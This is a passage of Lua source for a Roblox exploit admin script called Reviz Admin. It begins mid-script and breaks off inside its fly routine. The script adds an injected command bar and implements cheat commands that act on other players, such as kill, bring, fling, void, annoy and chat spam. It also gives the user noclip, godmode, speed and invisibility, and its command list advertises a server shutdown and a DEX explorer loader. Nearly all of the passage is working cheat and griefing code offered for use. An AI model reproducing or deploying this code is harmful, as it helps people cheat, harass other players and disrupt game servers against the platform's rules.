	local CMDBAR = Instance.new("TextBox")
	ScreenGui.Parent = game:GetService("CoreGui")
	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.new(0.3, 0.1, 0.1)
	Frame.BackgroundTransparency = 0.3
	Frame.Position = UDim2.new(0.5, 0, 0, 10)
	Frame.Size = UDim2.new(0, 200, 0, 40)
	Frame.Active = true
	Frame.Draggable = true
	CMDBAR.Name = "CMDBAR"
	CMDBAR.Parent = Frame
	CMDBAR.BackgroundColor3 = Color3.new(0.105882, 0.164706, 0.207843)
	CMDBAR.BackgroundTransparency = 0.20000000298023
	CMDBAR.Size = UDim2.new(0, 180, 0, 20)
	CMDBAR.Position = UDim2.new(0.05, 0, 0.25, 0)
	CMDBAR.Font = Enum.Font.SourceSansLight
	CMDBAR.FontSize = Enum.FontSize.Size14
	CMDBAR.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
	CMDBAR.TextScaled = true
	CMDBAR.TextSize = 14
	CMDBAR.TextWrapped = true
	CMDBAR.Text = "Press ; to type, Enter to execute"

	local CMDS = Instance.new("ScreenGui")
	local CMDSFRAME = Instance.new("Frame")
	local ScrollingFrame = Instance.new("ScrollingFrame")
	local TextLabel = Instance.new("TextLabel")
	local closegui = Instance.new("TextButton")
	CMDS.Name = "CMDS"
	CMDS.Parent = game:GetService("CoreGui")
	CMDSFRAME.Name = "CMDSFRAME"
	CMDSFRAME.Parent = CMDS
	CMDSFRAME.Active = true
	CMDSFRAME.BackgroundColor3 = Color3.new(0.223529, 0.231373, 0.309804)
	CMDSFRAME.BorderSizePixel = 0
	CMDSFRAME.Draggable = true
	CMDSFRAME.Position = UDim2.new(0, 315, 0, 100)
	CMDSFRAME.Size = UDim2.new(0, 275, 0, 275)
	CMDSFRAME.Visible = false
	ScrollingFrame.Parent = CMDSFRAME
	ScrollingFrame.BackgroundColor3 = Color3.new(0.160784, 0.160784, 0.203922)
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Position = UDim2.new(0, 0, 0.0729999989, 0)
	ScrollingFrame.Size = UDim2.new(1.04999995, 0, 0.92900002, 0)
	ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
	TextLabel.Parent = ScrollingFrame
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(0.930000007, 0, 1, 0)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.FontSize = Enum.FontSize.Size18
	TextLabel.Text = "[-] cmdbar is shown when ; is pressed.,\n[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player,\n[2] bring [plr] -- You need a tool! Will bring player to you,\n[3] spin [plr] -- You need a tool! Makes you and the player spin crazy,\n[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting,\n[5] attach [plr] -- You need a tool! Attaches you to player,\n[6] unattach [plr] -- Attempts to unattach you from a player,\n[7] follow [plr] -- Makes you follow behind the player,\n[8] unfollow,\n[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air,\n[10] trail [plr] -- The opposite of follow, you stay infront of player,\n[11] untrail,\n[12] orbit [plr] -- Makes you orbit the player,\n[13] unorbit,\n[14] fling [plr] -- Makes you fling the player,\n[15] unfling,\n[16] fecheck -- Checks if the game is FE or not,\n[17] void [plr] -- Teleports player to the void,\n[18] noclip -- Gives you noclip to walk through walls,\n[19] clip -- Removes noclip,\n[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default,\n[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default,\n[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default,\n[23] default -- Changes your speed, jumppower and hipheight to default values,\n[24] annoy [plr] -- Loop teleports you to the player,\n[25] unannoy,\n[26] headwalk [plr] -- Loop teleports you to the player head,\n[27] unheadwalk,\n[28] nolimbs -- Removes your arms and legs,\n[29] god -- Gives you FE Godmode,\n[30] drophats -- Drops your accessories,\n[31] droptool -- Drops any tool you have equipped,\n[32] loopdhats -- Loop drops your accessories,\n[33] unloopdhats,\n[34] loopdtool -- Loop drops any tools you have equipped,\n[35] unloopdtool,\n[36] invisible -- Gives you invisibility CREDIT TO TIMELESS,\n[37] view [plr] -- Changes your camera to the player character,\n[38] unview,\n[39] goto [plr] -- Teleports you to player,\n[40] fly -- Allows you to fly,\n[41] unfly,\n[42] chat [msg] -- Makes you chat a message,\n[43] spam [msg] -- Spams a message,\n[44] unspam,\n[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second,\n[46] pmspam [plr] -- Spams a player in private message,\n[47] unpmspam,\n[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you,\n[49] uncfreeze [plr],\n[50] unlockws -- Unlocks the workspace,\n[51] lockws -- Locks the workspace,\n[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you,\n[53] pstand -- Enables platform stand,\n[54] unpstand -- Disables platform stand,\n[55] blockhead -- Removes your head mesh,\n[56] sit,\n[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name,\n[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided,\n[59] hypertotal -- Loads in my FE GUI Hypertotal,\n[60] cmds -- Prints all commands,\n[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats,\n[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool,\n[63] spinner -- Makes you spin,\n[64] nospinner,\n[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom,\n[66] noreach -- Removes reach, must have tool equipped,\n[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying,\n[68] tp me [plr] -- Alternative to goto,\n[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player,\n[70] uncbring,\n[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players,\n[72] givetool [plr] -- Gives the tool you have equipped to the player,\n[73] glitch [plr] -- Glitches you and the player, looks very cool,\n[74] unglitch -- Unglitches you,\n[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode,\n[76] explorer -- Loads up DEX,\n[77] reset -- Resets your character.,\n[78] anim [id] -- Applies an animation on you, must be created by ROBLOX,\n[79] animgui -- Loads up Energize animations GUI,\n[80] savepos -- Saves your current position,\n[81] loadpos -- Teleports you to your saved position,\n[82] bang [plr] -- 18+,\n[83] unbang,\n[84] delcmdbar -- Removes the command bar completely,\n[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model,\n[86] shutdown -- Uses harkinians script to shutdown server,\n[87] respawn -- If grespawn doesnt work you can use respawn,\n[88] delobj [obj] -- Deletes a certain brick in workspace, client sided,\n[89] getplrs -- Prints all players in game,\n[90] deldecal -- Deletes all decals client sided,\n[91] opfinality -- Loads in my FE GUI Opfinality,\n[92] remotes -- Prints all remotes in the game in the console when added,\n[93] noremotes -- Stops printing remotes,\n[94] tpdefault -- Stops all loop teleports to a player,\n[95] stopsit -- Will not allow you to sit,\n[96] gosit -- Allows you to sit,\n[97] clicktp -- Enables click tp,\n[98] noclicktp -- Disables click tp,\n[99] toolson -- If any tools are dropped in the workspace you will automatically get them,\n[100] toolsoff -- Stops ;toolson,\n[101] version -- Gets the admin version, \n This list of commands is NOT showing everything, go to my thread in the pastebin link to see ALL commands."
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.TextSize = 15
	TextLabel.TextWrapped = true
	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	TextLabel.TextYAlignment = Enum.TextYAlignment.Top
	closegui.Name = "closegui"
	closegui.Parent = CMDSFRAME
	closegui.BackgroundColor3 = Color3.new(0.890196, 0.223529, 0.0588235)
	closegui.BorderSizePixel = 0
	closegui.Position = UDim2.new(0.995000005, 0, 0, 0)
	closegui.Size = UDim2.new(0.0545952693, 0, 0.0728644878, 0)
	closegui.Font = Enum.Font.SourceSansBold
	closegui.FontSize = Enum.FontSize.Size24
	closegui.Text = "X"
	closegui.TextColor3 = Color3.new(1, 1, 1)
	closegui.TextSize = 20

	closegui.MouseButton1Click:connect(function()
		CMDSFRAME.Visible = false
	end)

	game:GetService('RunService').Stepped:connect(function()
		if spin then
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[spinplr.Name].Character.HumanoidRootPart.CFrame
		end
		if followed then
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * -5
		end
		if traill then
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * 5
		end
		if annoying then
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[annplr.Name].Character.HumanoidRootPart.CFrame
		end
		if hwalk then
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[hdwplr.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
		end
		if staring then
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(lplayer.Character.Torso.Position, game:GetService("Players")[stareplr.Name].Character.Torso.Position)
		end
	end)
	game:GetService('RunService').Stepped:connect(function()
		if noclip then
			if lplayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
				lplayer.Character.Head.CanCollide = false
				lplayer.Character.Torso.CanCollide = false
				lplayer.Character["Left Leg"].CanCollide = false
				lplayer.Character["Right Leg"].CanCollide = false
			else
				lplayer.Character.Humanoid:ChangeState(11)
			end
		end
		if changingstate then
			lplayer.Character.Humanoid:ChangeState(statechosen)
		end
	end)
	game:GetService('RunService').Stepped:connect(function()
		if droppinghats then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Parent = workspace
				end
			end
		end
		if droppingtools then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Parent = workspace
				end
			end
		end
		if removingmeshhats then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if removingmeshtool then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
	end)
	game:GetService('RunService').Stepped:connect(function()
		if banpl then
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[bplrr].Character.HumanoidRootPart.CFrame
		end
	end)
	game:GetService('RunService').Stepped:connect(function()
		if stopsitting then
			lplayer.Character.Humanoid.Sit = false
		end
	end)

	plr = lplayer 
	hum = plr.Character.HumanoidRootPart
	mouse = plr:GetMouse() 
	mouse.KeyDown:connect(function(key) 
		if key == "e" then 
			if mouse.Target then 
				if clickgoto then
					hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
				elseif clickdel then
					mouse.Target:Destroy()
				end
			end 
		end
	end)

	game:GetService("Workspace").ChildAdded:connect(function(part)
		if gettingtools then
			if part:IsA("Tool") then
				part.Handle.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			end
		end
	end)

	lplayer.Chatted:Connect(function(msg)
		if string.sub(msg, 1, 6) == (prefix.."kill ") then
			if string.sub(msg, 7) == "me" then
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
			else
				for i,v in pairs(GetPlayer(string.sub(msg, 7)))do
					local NOW = lplayer.Character.HumanoidRootPart.CFrame
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					local function tp(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1:MoveTo(char2.Head.Position)
						end
					end
					wait(0.1)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.2)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.5)
					lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
					wait(0.7)
					tp(lplayer,game:GetService("Players")[v.Name])
					wait(0.7)
					lplayer.Character.HumanoidRootPart.CFrame = NOW
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."bring ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				local function tp(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
						char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
					end
				end
				local function getout(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
						char1:MoveTo(char2.Head.Position)
					end
				end
				tp(game:GetService("Players")[v.Name], lplayer)
				wait(0.2)
				tp(game:GetService("Players")[v.Name], lplayer)
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.5)
				getout(lplayer, game:GetService("Players")[v.Name])
				wait(0.3)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 6) == (prefix.."spin ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				lplayer.Character.Animate.Disabled = false
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				spinplr = v
				wait(0.5)
				spin = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."unspin") then
			spin = false
		end
		if string.sub(msg, 1, 8) == (prefix.."attach ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(0.3)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				attplr = v
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 10) == (prefix.."unattach ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
				local function getout(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
						char1:MoveTo(char2.Head.Position)
					end
				end
				getout(lplayer, game:GetService("Players")[v.Name])
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."follow ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
				followed = true
				flwplr = v
			end
		end
		if string.sub(msg, 1, 9) == (prefix.."unfollow") then
			followed = false
		end
		if string.sub(msg, 1, 10) == (prefix.."freefall ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."trail ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
				traill = true
				trlplr = v
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."untrail") then
			traill = false
		end
		if string.sub(msg, 1, 7) == (prefix.."orbit ") then
			if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
				lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			else
				for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
					local o = Instance.new("RocketPropulsion")
					o.Parent = lplayer.Character.HumanoidRootPart
					o.Name = "Orbit"
					o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
					o:Fire()
					noclip = true
				end
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."unorbit") then
			lplayer.Character.HumanoidRootPart.Orbit:Destroy()
			noclip = false
		end
		if string.sub(msg, 1, 7) == (prefix.."fling ") then
			if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
				lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			else
				for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
					local y = Instance.new("RocketPropulsion")
					y.Parent = lplayer.Character.HumanoidRootPart
					y.CartoonFactor = 1
					y.MaxThrust = 800000
					y.MaxSpeed = 1000
					y.ThrustP = 200000
					y.Name = "Fling"
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
					y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
					y:Fire()
					noclip = true
				end
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."unfling") then
			noclip = false
			lplayer.Character.HumanoidRootPart.Fling:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
			wait(0.4)
			lplayer.Character.HumanoidRootPart.Fling:Destroy()
		end
		if string.sub(msg, 1, 8) == (prefix.."fecheck") then
			if game:GetService("Workspace").FilteringEnabled == true then
				warn("FE is Enabled (Filtering Enabled)")
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "FE is Enabled";
					Text = "Filtering Enabled. Enjoy using Reviz Admin!";
				})
			else
				warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "FE is Disabled";
					Text = "Filtering Disabled. Consider using a different admin script.";
				})
			end
		end
		if string.sub(msg, 1, 6) == (prefix.."void ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."noclip") then
			noclip = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Noclip enabled";
				Text = "Type ;clip to disable";
			})
		end
		if string.sub(msg, 1, 5) == (prefix.."clip") then
			noclip = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Noclip disabled";
				Text = "Type ;noclip to enable";
			})
		end
		if string.sub(msg, 1, 7) == (prefix.."speed ") then
			lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 8))
		end
		if string.sub(msg, 1, 4) == (prefix.."ws ") then
			lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 5))
		end
		if string.sub(msg, 1, 11) == (prefix.."hipheight ") then
			lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 12))
		end
		if string.sub(msg, 1, 4) == (prefix.."hh ") then
			lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 5))
		end
		if string.sub(msg, 1, 11) == (prefix.."jumppower ") then
			lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 12))
		end
		if string.sub(msg, 1, 4) == (prefix.."jp ") then
			lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 5))
		end
		if string.sub(msg, 1, 8) == (prefix.."default") then
			lplayer.Character.Humanoid.JumpPower = 50
			lplayer.Character.Humanoid.WalkSpeed = 16
			lplayer.Character.Humanoid.HipHeight = 0
		end
		if string.sub(msg, 1, 7) == (prefix.."annoy ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
				annoying = true
				annplr = v
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."unannoy") then
			annoying = false
		end
		if string.sub(msg, 1, 10) == (prefix.."headwalk ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
				hwalk = true
				hdwplr = v
			end
		end
		if string.sub(msg, 1, 11) == (prefix.."unheadwalk") then
			hwalk = false
		end
		if string.sub(msg, 1, 8) == (prefix.."nolimbs") then
			lplayer.Character["Left Leg"]:Destroy()
			lplayer.Character["Left Arm"]:Destroy()
			lplayer.Character["Right Leg"]:Destroy()
			lplayer.Character["Right Arm"]:Destroy()
		end
		if string.sub(msg, 1, 4) == (prefix.."god") then
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "FE Godmode enabled";
				Text = "Use ;grespawn or ;respawn to remove";
			})
		end
		if string.sub(msg, 1, 9) == (prefix.."drophats") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Parent = workspace
				end
			end
		end
		if string.sub(msg, 1, 9) == (prefix.."droptool") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Parent = workspace
				end
			end
		end
		if string.sub(msg, 1, 10) == (prefix.."loopdhats") then
			droppinghats = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Loop Drop Enabled";
				Text = "Type ;unloopdhats to disable";
			})
		end
		if string.sub(msg, 1, 12) == (prefix.."unloopdhats") then
			droppinghats = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Loop Drop Disabled";
				Text = "Type ;loopdhats to enable.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."loopdtool") then
			droppingtools = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Loop Drop Enabled";
				Text = "Type ;unloopdtool to disable";
			})
		end
		if string.sub(msg, 1, 12) == (prefix.."unloopdtool") then
			droppingtools = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Loop Drop Disabled";
				Text = "Type ;loopdtool to enable.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."invisible") then -- Credit to Timeless
			Local = game:GetService('Players').LocalPlayer
			Char  = Local.Character
			touched,tpdback = false, false
			box = Instance.new('Part',workspace)
			box.Anchored = true
			box.CanCollide = true
			box.Size = Vector3.new(10,1,10)
			box.Position = Vector3.new(0,10000,0)
			box.Touched:connect(function(part)
				if (part.Parent.Name == Local.Name) then
					if touched == false then
						touched = true
						function apply()
							if script.Disabled ~= true then
								no = Char.HumanoidRootPart:Clone()
								wait(.25)
								Char.HumanoidRootPart:Destroy()
								no.Parent = Char
								Char:MoveTo(loc)
								touched = false
							end end
						if Char then
							apply()
						end
					end
				end
			end)
			repeat wait() until Char
			loc = Char.HumanoidRootPart.Position
			Char:MoveTo(box.Position + Vector3.new(0,.5,0))
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Invisibility enabled!";
				Text = "Reset or use ;respawn to remove.";
			})
		end
		if string.sub(msg, 1, 6) == (prefix.."view ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
				if game:GetService("Players")[v.Name].Character.Humanoid then
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
				else
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
				end
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."unview") then
			if lplayer.Character.Humanoid then
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
			else
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
			end
		end
		if string.sub(msg, 1, 6) == (prefix.."goto ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			end
		end
		if string.sub(msg, 1, 4) == (prefix.."fly") then
			repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
			repeat wait() until Mouse

			local T = lplayer.Character.HumanoidRootPart
			local CONTROL = {F = 0, B = 0, L = 0, R = 0}
			local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			local SPEED = speedget

			local function fly()
				flying = true
				local BG = Instance.new('BodyGyro', T)
				local BV = Instance.new('BodyVelocity', T)
				BG.P = 9e4
				BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				BG.cframe = T.CFrame
				BV.velocity = Vector3.new(0, 0.1, 0)
				BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
				spawn(function()
					repeat wait()
						lplayer.Character.Humanoid.PlatformStand = true
						if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
							SPEED = 50
						elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
							SPEED = 0
						end
						if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
							BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
							lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
						elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
